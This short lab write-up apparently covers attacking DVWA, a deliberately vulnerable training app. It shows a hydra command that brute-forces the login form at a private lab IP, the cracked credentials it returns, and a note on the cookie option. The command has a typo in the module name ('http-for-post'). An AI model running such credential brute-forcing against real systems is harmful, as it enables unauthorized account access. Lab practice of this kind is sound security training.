# Brute Forcing

Assuming no knowledge of the credentials, let's just try to brute force the login page

```bash
$ hydra -L /usr/share/wordlists/wfuzz/general/common.txt \
        -P /usr/share/wordlists/wfuzz/general/common.txt \
		192.168.56.6
		http-for-post
		'/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed:C=/dvwa/'
[http-post-form] host: 192.168.56.6   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found		
```

The options are pretty self-explanatory. Note that `C=/dvwa/` is included to gather and set the 2 required cookies - `PHPSESSID` AND `security` - prior to issuing the form POST.
